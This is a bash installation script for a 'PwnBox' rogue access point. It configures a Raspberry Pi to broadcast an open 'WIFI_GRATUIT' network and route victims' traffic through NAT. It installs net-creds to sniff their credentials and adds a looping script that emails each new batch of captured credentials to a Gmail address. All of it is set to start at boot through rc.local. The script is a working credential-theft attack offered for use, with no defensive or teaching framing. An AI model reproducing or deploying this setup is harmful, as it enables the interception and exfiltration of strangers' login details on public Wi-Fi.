#!/bin/bash
########################
# PwnBox AP installation script
# date : 27/07/2019 - v
########################
echo "
██████╗ ██╗    ██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗
██╔══██╗██║    ██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝
██████╔╝██║ █╗ ██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝
██╔═══╝ ██║███╗██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗
██║     ╚███╔███╔╝██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
"
# ---------------------------------------------
#
# VERIFY RUN AS ROOT
#
# ---------------------------------------------
if [[ $EUID -ne 0 ]]; then
    echo "Work like a true hacker ! run the script as ROOT !"
    exit 1
fi
# ---------------------------------------------
#
# INSTALLING REQUIRED TOOLS
#
# ---------------------------------------------
apt update
exists()
{
    command -v "$1" >/dev/null 2>&1
}
echo "---------------------------------------------"
echo "installing required tools"
echo "---------------------------------------------"
## sendemail ##
if exists sendemail; then
    echo 'The program sendemail exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing sendemail..'
    apt-get install sendemail -y
	apt-get install libnet-ssleay-perl -y
	apt-get install libio-socket-ssl-perl -y
fi
## Git ##
if exists git; then
    echo 'The program Git exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing Git..'
    apt-get install git -y
fi
## curl ##
if exists curl; then
    echo 'The program curl exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing curl ..'
    apt-get install curl -y
fi
## hostapd ##
if exists hostapd; then
    echo 'The program hostapd exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing hostapd ..'
    apt-get install hostapd -y
fi
## dnsmasq ##
if exists dnsmasq; then
    echo 'The program dnsmasq exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing dnsmasq ..'
    apt-get install dnsmasq -y
fi
## apache2 ##
if exists apache2; then
    echo 'The program apache2 exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing apache2 ..'
    apt-get install apache2 -y
fi
## php ##
if exists php; then
    echo 'The program php exists!'
else
    echo 'Your system does not have the program'
    echo '###Installing php ..'
    apt-get install php -y
fi
pip install scapy
# ---------------------------------------------
#
# BACKUPING CONFIGURATIONS FILES
#
# ---------------------------------------------
# ---------------------------------------------
# BACKUP IN  /home/pi/backup/
# ---------------------------------------------
echo "---------------------------------------------"
echo "backup full configuration files"
echo "---------------------------------------------"
mkdir /home/pi/backup
cp /etc/network/interfaces /home/pi/backup/
cp /proc/sys/net/ipv4/ip_forward /home/pi/backup/
cp /etc/apache2/apache2.conf  /home/pi/backup/
cp /etc/dhcpcd.conf /home/pi/backup/
cp /etc/dnsmasq.conf /home/pi/backup/
cp /etc/sysctl.conf /home/pi/backup/
iptables-save > /home/pi/backup/iptables.backup
# ---------------------------------------------
#
# CONFIGURE THE NETWORK
#
# ---------------------------------------------
echo "---------------------------------------------"
echo "bypass the dhcpcd.conf ..."
echo "---------------------------------------------"
echo "denyinterfaces eth0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan0" >> /etc/dhcpcd.conf
echo "denyinterfaces wlan1" >> /etc/dhcpcd.conf
echo "---------------------------------------------"
echo " Now editing the ip configuration"
echo "---------------------------------------------"
echo "
auto wlan1
auto eth0
allow-hotplug wlan1
iface wlan1 inet static
    address 192.168.50.1
    netmask 255.255.255.0
    network 192.168.50.0
allow-hotplug eth0
iface eth0 inet dhcp
" > /etc/network/interfaces
# ---------------------------------------------
#
# CONFIGURE THE DNS
#
# ---------------------------------------------
echo "---------------------------------------------"
echo " Configuring dnsmasq"
echo "---------------------------------------------"
echo "
interface=wlan1
listen-address=192.168.50.1
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
dhcp-range=192.168.50.50,192.168.50.150,12h
listen-address=192.168.50.1
" >> /etc/dnsmasq.conf
# ---------------------------------------------
#
# CONFIGURE HOSTAPD
#
# ---------------------------------------------
echo "---------------------------------------------"
echo " Creating wifi.conf for hostapd"
echo "---------------------------------------------"
# generating the defaut configuration file for exemple you can easly edit this file
touch /home/pi/wifi.conf
echo "
interface=wlan1
driver=nl80211
ssid=WIFI_GRATUIT
hw_mode=g
channel=0
ieee80211d=1
country_code=FR
ieee80211n=1
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" >> /home/pi/wifi.conf
echo "---------------------------------------------"
echo "configuring the NAT"
echo "---------------------------------------------"
sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
echo "---------------------------------------------"
echo "configuring IPTABLES"
echo "---------------------------------------------"
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT
sh -c "iptables-save > /etc/iptables.ipv4.nat"
echo "up iptables-restore < /etc/iptables.ipv4.nat" >> /etc/network/interfaces
echo "---------------------------------------------"
echo "configuring PERSISTENT ROUTING"
echo "---------------------------------------------"
sed -ir 's/#{1,}?net.ipv4.ip_forward ?= ?(0|1)/net.ipv4.ip_forward = 1/g' /etc/sysctl.conf
# AP configuration is done 
echo "---------------------------------------------"
echo "Installing net-creds for MITM"
echo "---------------------------------------------"
cd /root
git clone https://github.com/DanMcInerney/net-creds MITMAP
echo "net-creds is installed"
# once net-creds is installed configure the rogue ap at startup 
echo "---------------------------------------------"
echo "configuring Credentials Sender"
echo "---------------------------------------------"
echo '
#!/bin/bash
gmailsrc=src@gmail.com
gmaildest=dest@gmail.com
gmailpwd=PASSWORD
filename="/root/MITMAP/credentials.txt"
m1=$(sudo md5sum "$filename")
while true; do
  sleep 5
  m2=$(sudo md5sum "$filename")
  if [ "$m1" != "$m2" ] ; then
    echo "ERROR: File has changed!" >&2
        credsfile=$(sudo cat /root/MITMAP/credentials.txt)
        sendEmail -o tls=yes -f $gmailsrc -t $gmaildest -s smtp.gmail.com:587 -xu $gmailsrc -xp $gmailpwd -u "RogueAP Captured Credentials" -m " $credsfile "
        m1=$m2
#    exit 1
  fi
done
' >> /home/pi/check.sh
# create sniffer script
echo "---------------------------------------------"
echo "configuring sniffer"
echo "---------------------------------------------"
echo "
#!/bin/bash
cd /root/MITMAP
sudo python net-creds.py -i eth0
" >> /home/pi/sniffer.sh
#create start ap script 
echo "---------------------------------------------"
echo "configuring hostapd Startup"
echo "---------------------------------------------"
echo '
sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo service dnsmasq start
sudo hostapd /home/pi/wifi.conf
' >> /home/pi/startap.sh
# executable
chmod +x /home/pi/sniffer.sh
chmod +x /home/pi/startap.sh
chmod +x /home/pi/check.sh
# startup
echo "---------------------------------------------"
echo "configuring RogueAP Startup"
echo "---------------------------------------------"
echo '
[Unit]
 Description=/etc/rc.local Compatibility
 ConditionPathExists=/etc/rc.local

[Service]
 Type=forking
 ExecStart=/etc/rc.local start
 TimeoutSec=0
 StandardOutput=tty
 RemainAfterExit=yes
 SysVStartPriority=99

[Install]
 WantedBy=multi-user.target
' > /etc/systemd/system/rc-local.service
chmod +x /etc/rc.local
systemctl enable rc-local
echo "" > /etc/rc.local
echo "#!/bin/bash" >> /etc/rc.local
echo "bash /home/pi/startap.sh &" >> /etc/rc.local
echo "bash /home/pi/sniffer.sh &" >> /etc/rc.local
echo "bash /home/pi/check.sh &" >> /etc/rc.local
echo "exit 0" >> /etc/rc.local
echo "rogue ap is installed !"
# remove ap script https://github.com/Thomas-Clauzel/devpwnbox/blob/master/pwnbox/remove_ap.sh 
echo "press the keyboard for reboot"
systemctl enable rc-local
read pause
#reboot
# https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd
